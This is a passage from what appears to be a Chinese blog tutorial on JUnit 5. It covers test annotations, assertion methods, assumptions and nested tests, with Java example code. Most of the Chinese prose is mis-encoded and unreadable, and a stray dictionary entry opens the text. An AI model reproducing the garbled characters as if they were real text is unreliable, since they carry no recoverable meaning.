[ËˆvÉªntÉªdÊ’]   ç¾ [ËˆvÉªntÉªdÊ’]</p><p>n. ç‰¹å®šå¹´ä»½(æˆ–åœ°æ–¹)é…¿åˆ¶çš„é…’;é…¿é€ å¹´ä»½;é‡‡æ‘˜è‘¡è„é…¿é…’çš„æœŸé—´(æˆ–å­£èŠ‚);è‘¡è„æ”¶è·æœŸ(æˆ–å­£èŠ‚)</p><p>adj. (æŒ‡è‘¡è„é…’)ä¼˜è´¨çš„ï¼Œä¸Šç­‰çš„ï¼Œä½³é…¿çš„;å¤è‰²å¤é¦™çš„(æŒ‡1917â€“1930å¹´é—´åˆ¶é€ ï¼Œè½¦å‹å’Œå“å‘³å—äººé’ççš„);(è¿‡å»æŸä¸ªæ—¶æœŸ)å…¸å‹çš„ï¼Œä¼˜è´¨çš„;(æŸäººçš„)æœ€ä½³ä½œå“çš„</p></blockquote><h2 id="72ã€å•å…ƒæµ‹è¯•-å¸¸ç”¨æµ‹è¯•æ³¨è§£"><a href="#72ã€å•å…ƒæµ‹è¯•-å¸¸ç”¨æµ‹è¯•æ³¨è§£" class="headerlink" title="72ã€å•å…ƒæµ‹è¯•-å¸¸ç”¨æµ‹è¯•æ³¨è§£"></a>72ã€å•å…ƒæµ‹è¯•-å¸¸ç”¨æµ‹è¯•æ³¨è§£</h2><p><a href="https://junit.org/junit5/docs/current/user-guide/#writing-tests-annotations">å®˜æ–¹æ–‡æ¡£ - Annotations</a></p><ul><li><strong>@Test</strong>ï¼šè¡¨ç¤ºæ–¹æ³•æ˜¯æµ‹è¯•æ–¹æ³•ã€‚ä½†æ˜¯ä¸JUnit4çš„@Testä¸åŒï¼Œä»–çš„èŒè´£éå¸¸å•ä¸€ä¸èƒ½å£°æ˜ä»»ä½•å±æ€§ï¼Œæ‹“å±•çš„æµ‹è¯•å°†ä¼šç”±Jupiteræä¾›é¢å¤–æµ‹è¯•</li><li><strong>@ParameterizedTest</strong>ï¼šè¡¨ç¤ºæ–¹æ³•æ˜¯å‚æ•°åŒ–æµ‹è¯•ã€‚</li><li><strong>@RepeatedTest</strong>ï¼šè¡¨ç¤ºæ–¹æ³•å¯é‡å¤æ‰§è¡Œã€‚</li><li><strong>@DisplayName</strong>ï¼šä¸ºæµ‹è¯•ç±»æˆ–è€…æµ‹è¯•æ–¹æ³•è®¾ç½®å±•ç¤ºåç§°ã€‚</li><li><strong>@BeforeEach</strong>ï¼šè¡¨ç¤ºåœ¨<strong>æ¯ä¸ª</strong>å•å…ƒæµ‹è¯•<strong>ä¹‹å‰</strong>æ‰§è¡Œã€‚</li><li><strong>@AfterEach</strong>ï¼šè¡¨ç¤ºåœ¨<strong>æ¯ä¸ª</strong>å•å…ƒæµ‹è¯•<strong>ä¹‹å</strong>æ‰§è¡Œã€‚</li><li><strong>@BeforeAll</strong>ï¼šè¡¨ç¤ºåœ¨<strong>æ‰€æœ‰</strong>å•å…ƒæµ‹è¯•<strong>ä¹‹å‰</strong>æ‰§è¡Œã€‚</li><li><strong>@AfterAll</strong>ï¼šè¡¨ç¤ºåœ¨<strong>æ‰€æœ‰</strong>å•å…ƒæµ‹è¯•<strong>ä¹‹å</strong>æ‰§è¡Œã€‚</li><li><strong>@Tag</strong>ï¼šè¡¨ç¤ºå•å…ƒæµ‹è¯•ç±»åˆ«ï¼Œç±»ä¼¼äºJUnit4ä¸­çš„@Categoriesã€‚</li><li><strong>@Disabled</strong>ï¼šè¡¨ç¤ºæµ‹è¯•ç±»æˆ–æµ‹è¯•æ–¹æ³•ä¸æ‰§è¡Œï¼Œç±»ä¼¼äºJUnit4ä¸­çš„@Ignoreã€‚</li><li><strong>@Timeout</strong>ï¼šè¡¨ç¤ºæµ‹è¯•æ–¹æ³•è¿è¡Œå¦‚æœè¶…è¿‡äº†æŒ‡å®šæ—¶é—´å°†ä¼šè¿”å›é”™è¯¯ã€‚</li><li><strong>@ExtendWith</strong>ï¼šä¸ºæµ‹è¯•ç±»æˆ–æµ‹è¯•æ–¹æ³•æä¾›æ‰©å±•ç±»å¼•ç”¨ã€‚</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.junit.jupiter.api.*;<br><br><span class="hljs-meta">@DisplayName(&quot;junit5åŠŸèƒ½æµ‹è¯•ç±»&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Junit5Test</span> &#123;<br><br><br>    <span class="hljs-meta">@DisplayName(&quot;æµ‹è¯•displaynameæ³¨è§£&quot;)</span><br>    <span class="hljs-meta">@Test</span><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">testDisplayName</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-number">1</span>);<br>        System.out.println(jdbcTemplate);<br>    &#125;<br>    <br>    <span class="hljs-meta">@ParameterizedTest</span><br>    <span class="hljs-meta">@ValueSource(strings = &#123; &quot;racecar&quot;, &quot;radar&quot;, &quot;able was I ere I saw elba&quot; &#125;)</span><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">palindromes</span><span class="hljs-params">(String candidate)</span> &#123;<br>        assertTrue(StringUtils.isPalindrome(candidate));<br>    &#125;<br>    <br><br>    <span class="hljs-meta">@Disabled</span><br>    <span class="hljs-meta">@DisplayName(&quot;æµ‹è¯•æ–¹æ³•2&quot;)</span><br>    <span class="hljs-meta">@Test</span><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">test2</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-number">2</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@RepeatedTest(5)</span><br>    <span class="hljs-meta">@Test</span><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">test3</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-number">5</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * è§„å®šæ–¹æ³•è¶…æ—¶æ—¶é—´ã€‚è¶…å‡ºæ—¶é—´æµ‹è¯•å‡ºå¼‚å¸¸</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@throws</span> InterruptedException</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-meta">@Timeout(value = 500, unit = TimeUnit.MILLISECONDS)</span><br>    <span class="hljs-meta">@Test</span><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">testTimeout</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> InterruptedException &#123;<br>        Thread.sleep(<span class="hljs-number">600</span>);<br>    &#125;<br><br><br>    <span class="hljs-meta">@BeforeEach</span><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">testBeforeEach</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;æµ‹è¯•å°±è¦å¼€å§‹äº†...&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@AfterEach</span><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">testAfterEach</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;æµ‹è¯•ç»“æŸäº†...&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@BeforeAll</span><br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testBeforeAll</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;æ‰€æœ‰æµ‹è¯•å°±è¦å¼€å§‹äº†...&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@AfterAll</span><br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testAfterAll</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;æ‰€æœ‰æµ‹è¯•ä»¥åŠç»“æŸäº†...&quot;</span>);<br><br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="73ã€å•å…ƒæµ‹è¯•-æ–­è¨€æœºåˆ¶"><a href="#73ã€å•å…ƒæµ‹è¯•-æ–­è¨€æœºåˆ¶" class="headerlink" title="73ã€å•å…ƒæµ‹è¯•-æ–­è¨€æœºåˆ¶"></a>73ã€å•å…ƒæµ‹è¯•-æ–­è¨€æœºåˆ¶</h2><p>æ–­è¨€Assertionæ˜¯æµ‹è¯•æ–¹æ³•ä¸­çš„æ ¸å¿ƒéƒ¨åˆ†ï¼Œç”¨æ¥å¯¹æµ‹è¯•éœ€è¦æ»¡è¶³çš„æ¡ä»¶è¿›è¡ŒéªŒè¯ã€‚è¿™äº›æ–­è¨€æ–¹æ³•éƒ½æ˜¯org.junit.jupiter.api.Assertionsçš„é™æ€æ–¹æ³•ã€‚æ£€æŸ¥ä¸šåŠ¡é€»è¾‘è¿”å›çš„æ•°æ®æ˜¯å¦åˆç†ã€‚æ‰€æœ‰çš„æµ‹è¯•è¿è¡Œç»“æŸä»¥åï¼Œä¼šæœ‰ä¸€ä¸ªè¯¦ç»†çš„æµ‹è¯•æŠ¥å‘Šã€‚</p><p>JUnit 5 å†…ç½®çš„æ–­è¨€å¯ä»¥åˆ†æˆå¦‚ä¸‹å‡ ä¸ªç±»åˆ«ï¼š</p><h3 id="ç®€å•æ–­è¨€"><a href="#ç®€å•æ–­è¨€" class="headerlink" title="ç®€å•æ–­è¨€"></a>ç®€å•æ–­è¨€</h3><p>ç”¨æ¥å¯¹å•ä¸ªå€¼è¿›è¡Œç®€å•çš„éªŒè¯ã€‚å¦‚ï¼š</p><table><thead><tr><th>æ–¹æ³•</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>assertEquals</td><td>åˆ¤æ–­ä¸¤ä¸ªå¯¹è±¡æˆ–ä¸¤ä¸ªåŸå§‹ç±»å‹æ˜¯å¦ç›¸ç­‰</td></tr><tr><td>assertNotEquals</td><td>åˆ¤æ–­ä¸¤ä¸ªå¯¹è±¡æˆ–ä¸¤ä¸ªåŸå§‹ç±»å‹æ˜¯å¦ä¸ç›¸ç­‰</td></tr><tr><td>assertSame</td><td>åˆ¤æ–­ä¸¤ä¸ªå¯¹è±¡å¼•ç”¨æ˜¯å¦æŒ‡å‘åŒä¸€ä¸ªå¯¹è±¡</td></tr><tr><td>assertNotSame</td><td>åˆ¤æ–­ä¸¤ä¸ªå¯¹è±¡å¼•ç”¨æ˜¯å¦æŒ‡å‘ä¸åŒçš„å¯¹è±¡</td></tr><tr><td>assertTrue</td><td>åˆ¤æ–­ç»™å®šçš„å¸ƒå°”å€¼æ˜¯å¦ä¸º true</td></tr><tr><td>assertFalse</td><td>åˆ¤æ–­ç»™å®šçš„å¸ƒå°”å€¼æ˜¯å¦ä¸º false</td></tr><tr><td>assertNull</td><td>åˆ¤æ–­ç»™å®šçš„å¯¹è±¡å¼•ç”¨æ˜¯å¦ä¸º null</td></tr><tr><td>assertNotNull</td><td>åˆ¤æ–­ç»™å®šçš„å¯¹è±¡å¼•ç”¨æ˜¯å¦ä¸ä¸º null</td></tr></tbody></table><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Test</span><br><span class="hljs-meta">@DisplayName(&quot;simple assertion&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">simple</span><span class="hljs-params">()</span> &#123;<br>     assertEquals(<span class="hljs-number">3</span>, <span class="hljs-number">1</span> + <span class="hljs-number">2</span>, <span class="hljs-string">&quot;simple math&quot;</span>);<br>     assertNotEquals(<span class="hljs-number">3</span>, <span class="hljs-number">1</span> + <span class="hljs-number">1</span>);<br><br>     assertNotSame(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>());<br>     <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();<br>     assertSame(obj, obj);<br><br>     assertFalse(<span class="hljs-number">1</span> &gt; <span class="hljs-number">2</span>);<br>     assertTrue(<span class="hljs-number">1</span> &lt; <span class="hljs-number">2</span>);<br><br>     assertNull(<span class="hljs-literal">null</span>);<br>     assertNotNull(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>());<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="æ•°ç»„æ–­è¨€"><a href="#æ•°ç»„æ–­è¨€" class="headerlink" title="æ•°ç»„æ–­è¨€"></a>æ•°ç»„æ–­è¨€</h3><p>é€šè¿‡ assertArrayEquals æ–¹æ³•æ¥åˆ¤æ–­ä¸¤ä¸ªå¯¹è±¡æˆ–åŸå§‹ç±»å‹çš„æ•°ç»„æ˜¯å¦ç›¸ç­‰ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Test</span><br><span class="hljs-meta">@DisplayName(&quot;array assertion&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">array</span><span class="hljs-params">()</span> &#123;<br>assertArrayEquals(<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[] &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>&#125;);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="ç»„åˆæ–­è¨€"><a href="#ç»„åˆæ–­è¨€" class="headerlink" title="ç»„åˆæ–­è¨€"></a>ç»„åˆæ–­è¨€</h3><p><code>assertAll()</code>æ–¹æ³•æ¥å—å¤šä¸ª <code>org.junit.jupiter.api.Executable</code> å‡½æ•°å¼æ¥å£çš„å®ä¾‹ä½œä¸ºè¦éªŒè¯çš„æ–­è¨€ï¼Œå¯ä»¥é€šè¿‡ lambda è¡¨è¾¾å¼å¾ˆå®¹æ˜“çš„æä¾›è¿™äº›æ–­è¨€ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Test</span><br><span class="hljs-meta">@DisplayName(&quot;assert all&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">all</span><span class="hljs-params">()</span> &#123;<br> assertAll(<span class="hljs-string">&quot;Math&quot;</span>,<br>    () -&gt; assertEquals(<span class="hljs-number">2</span>, <span class="hljs-number">1</span> + <span class="hljs-number">1</span>),<br>    () -&gt; assertTrue(<span class="hljs-number">1</span> &gt; <span class="hljs-number">0</span>)<br> );<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="å¼‚å¸¸æ–­è¨€"><a href="#å¼‚å¸¸æ–­è¨€" class="headerlink" title="å¼‚å¸¸æ–­è¨€"></a>å¼‚å¸¸æ–­è¨€</h3><p>åœ¨JUnit4æ—¶æœŸï¼Œæƒ³è¦æµ‹è¯•æ–¹æ³•çš„å¼‚å¸¸æƒ…å†µæ—¶ï¼Œéœ€è¦ç”¨<code>@Rule</code>æ³¨è§£çš„<code>ExpectedException</code>å˜é‡è¿˜æ˜¯æ¯”è¾ƒéº»çƒ¦çš„ã€‚è€ŒJUnit5æä¾›äº†ä¸€ç§æ–°çš„æ–­è¨€æ–¹å¼<code>Assertions.assertThrows()</code>ï¼Œé…åˆå‡½æ•°å¼ç¼–ç¨‹å°±å¯ä»¥è¿›è¡Œä½¿ç”¨ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Test</span><br><span class="hljs-meta">@DisplayName(&quot;å¼‚å¸¸æµ‹è¯•&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">exceptionTest</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">ArithmeticException</span> <span class="hljs-variable">exception</span> <span class="hljs-operator">=</span> Assertions.assertThrows(<br>           <span class="hljs-comment">//æ‰”å‡ºæ–­è¨€å¼‚å¸¸</span><br>            ArithmeticException.class, () -&gt; System.out.println(<span class="hljs-number">1</span> % <span class="hljs-number">0</span>));<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="è¶…æ—¶æ–­è¨€"><a href="#è¶…æ—¶æ–­è¨€" class="headerlink" title="è¶…æ—¶æ–­è¨€"></a>è¶…æ—¶æ–­è¨€</h3><p>JUnit5è¿˜æä¾›äº†Assertions.assertTimeout()ä¸ºæµ‹è¯•æ–¹æ³•è®¾ç½®äº†è¶…æ—¶æ—¶é—´ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Test</span><br><span class="hljs-meta">@DisplayName(&quot;è¶…æ—¶æµ‹è¯•&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">timeoutTest</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-comment">//å¦‚æœæµ‹è¯•æ–¹æ³•æ—¶é—´è¶…è¿‡1så°†ä¼šå¼‚å¸¸</span><br>    Assertions.assertTimeout(Duration.ofMillis(<span class="hljs-number">1000</span>), () -&gt; Thread.sleep(<span class="hljs-number">500</span>));<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="å¿«é€Ÿå¤±è´¥"><a href="#å¿«é€Ÿå¤±è´¥" class="headerlink" title="å¿«é€Ÿå¤±è´¥"></a>å¿«é€Ÿå¤±è´¥</h3><p>é€šè¿‡ fail æ–¹æ³•ç›´æ¥ä½¿å¾—æµ‹è¯•å¤±è´¥ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Test</span><br><span class="hljs-meta">@DisplayName(&quot;fail&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">shouldFail</span><span class="hljs-params">()</span> &#123;<br>fail(<span class="hljs-string">&quot;This should fail&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="74ã€å•å…ƒæµ‹è¯•-å‰ç½®æ¡ä»¶"><a href="#74ã€å•å…ƒæµ‹è¯•-å‰ç½®æ¡ä»¶" class="headerlink" title="74ã€å•å…ƒæµ‹è¯•-å‰ç½®æ¡ä»¶"></a>74ã€å•å…ƒæµ‹è¯•-å‰ç½®æ¡ä»¶</h2><p>Unit 5 ä¸­çš„å‰ç½®æ¡ä»¶ï¼ˆassumptionsã€å‡è®¾ã€‘ï¼‰ç±»ä¼¼äºæ–­è¨€ï¼Œä¸åŒä¹‹å¤„åœ¨äºä¸æ»¡è¶³çš„<strong>æ–­è¨€assertions</strong>ä¼šä½¿å¾—æµ‹è¯•æ–¹æ³•å¤±è´¥ï¼Œè€Œ<strong>ä¸æ»¡è¶³çš„å‰ç½®æ¡ä»¶åªä¼šä½¿å¾—æµ‹è¯•æ–¹æ³•çš„æ‰§è¡Œç»ˆæ­¢</strong>ã€‚</p><p>å‰ç½®æ¡ä»¶å¯ä»¥çœ‹æˆæ˜¯æµ‹è¯•æ–¹æ³•æ‰§è¡Œçš„å‰æï¼Œå½“è¯¥å‰æä¸æ»¡è¶³æ—¶ï¼Œå°±æ²¡æœ‰ç»§ç»­æ‰§è¡Œçš„å¿…è¦ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@DisplayName(&quot;å‰ç½®æ¡ä»¶&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AssumptionsTest</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">environment</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;DEV&quot;</span>;<br><br>    <span class="hljs-meta">@Test</span><br>    <span class="hljs-meta">@DisplayName(&quot;simple&quot;)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">simpleAssume</span><span class="hljs-params">()</span> &#123;<br>        assumeTrue(Objects.equals(<span class="hljs-built_in">this</span>.environment, <span class="hljs-string">&quot;DEV&quot;</span>));<br>        assumeFalse(() -&gt; Objects.equals(<span class="hljs-built_in">this</span>.environment, <span class="hljs-string">&quot;PROD&quot;</span>));<br>    &#125;<br><br>    <span class="hljs-meta">@Test</span><br>    <span class="hljs-meta">@DisplayName(&quot;assume then do&quot;)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">assumeThenDo</span><span class="hljs-params">()</span> &#123;<br>        assumingThat(<br>            Objects.equals(<span class="hljs-built_in">this</span>.environment, <span class="hljs-string">&quot;DEV&quot;</span>),<br>            () -&gt; System.out.println(<span class="hljs-string">&quot;In DEV&quot;</span>)<br>        );<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>assumeTrue</code> å’Œ <code>assumFalse</code> ç¡®ä¿ç»™å®šçš„æ¡ä»¶ä¸º <code>true</code> æˆ– <code>false</code>ï¼Œä¸æ»¡è¶³æ¡ä»¶ä¼šä½¿å¾—æµ‹è¯•æ‰§è¡Œç»ˆæ­¢ã€‚</p><p><code>assumingThat</code> çš„å‚æ•°æ˜¯è¡¨ç¤ºæ¡ä»¶çš„å¸ƒå°”å€¼å’Œå¯¹åº”çš„ Executable æ¥å£çš„å®ç°å¯¹è±¡ã€‚åªæœ‰æ¡ä»¶æ»¡è¶³æ—¶ï¼Œ<code>Executable</code> å¯¹è±¡æ‰ä¼šè¢«æ‰§è¡Œï¼›å½“æ¡ä»¶ä¸æ»¡è¶³æ—¶ï¼Œæµ‹è¯•æ‰§è¡Œå¹¶ä¸ä¼šç»ˆæ­¢ã€‚</p><h2 id="75ã€å•å…ƒæµ‹è¯•-åµŒå¥—æµ‹è¯•"><a href="#75ã€å•å…ƒæµ‹è¯•-åµŒå¥—æµ‹è¯•" class="headerlink" title="75ã€å•å…ƒæµ‹è¯•-åµŒå¥—æµ‹è¯•"></a>75ã€å•å…ƒæµ‹è¯•-åµŒå¥—æµ‹è¯•</h2><p><a href="https://junit.org/junit5/docs/current/user-guide/#writing-tests-nested">å®˜æ–¹æ–‡æ¡£ - Nested Tests</a></p><p>JUnit 5 å¯ä»¥é€šè¿‡ Java ä¸­çš„å†…éƒ¨ç±»å’Œ<code>@Nested</code> æ³¨è§£å®ç°åµŒå¥—æµ‹è¯•ï¼Œä»è€Œå¯ä»¥æ›´å¥½çš„æŠŠç›¸å…³çš„æµ‹è¯•æ–¹æ³•ç»„ç»‡åœ¨ä¸€èµ·ã€‚åœ¨å†…éƒ¨ç±»ä¸­å¯ä»¥ä½¿ç”¨<code>@BeforeEach</code> å’Œ<code>@AfterEach</code>æ³¨è§£ï¼Œè€Œä¸”åµŒå¥—çš„å±‚æ¬¡æ²¡æœ‰é™åˆ¶ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@DisplayName(&quot;A stack&quot;)</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">TestingAStackDemo</span> &#123;<br><br>    Stack&lt;Object&gt; stack;<br><br>    <span class="hljs-meta">@Test</span><br>    <span class="hljs-meta">@DisplayName(&quot;is instantiated with new Stack()&quot;)</span><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">isInstantiatedWithNew</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Stack</span>&lt;&gt;();<br>    &#125;<br><br>    <span class="hljs-meta">@Nested</span><br>    <span class="hljs-meta">@DisplayName(&quot;when new&quot;)</span><br>    <span class="hljs-keyword">class</span> <span class="hljs-title class_">WhenNew</span> &#123;<br><br>        <span class="hljs-meta">@BeforeEach</span><br>        <span class="hljs-keyword">void</span> <span class="hljs-title function_">createNewStack</span><span class="hljs-params">()</span> &#123;<br>            stack = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Stack</span>&lt;&gt;();<br>        &#125;<br><br>        <span class="hljs-meta">@Test</span><br>        <span class="hljs-meta">@DisplayName(&quot;is empty&quot;)</span><br>        <span class="hljs-keyword">void</span> <span class="hljs-title function_">isEmpty</span><span class="hljs-params">()</span> &#123;<br>            assertTrue(stack.isEmpty());<br>        &#125;<br><br>        <span class="hljs-meta">@Test</span><br>        <span class="hljs-meta">@DisplayName(&quot;throws EmptyStackException when popped&quot;)</span><br>        <span class="hljs-keyword">void</span> <span class="hljs-title function_">throwsExceptionWhenPopped</span><span class="hljs-params">()</span> &#123;<br>            assertThrows(EmptyStackException.class, stack::pop);<br>        &#125;<br><br>        <span class="hljs-meta">@Test</span><br>        <span class="hljs-meta">@DisplayName(&quot;throws EmptyStackException when peeked&quot;)</span><br>        <span class="hljs-keyword">void</span> <span class="hljs-title function_">throwsExceptionWhenPeeked</span><span class="hljs-params">()</span> &#123;<br>            assertThrows(EmptyStackException.class, stack::peek);<br>        &#125;<br><br>        <span class="hljs-meta">@Nested</span><br>        <span class="hljs-meta">@DisplayName(&quot;after pushing an element&quot;)</span><br>        <span 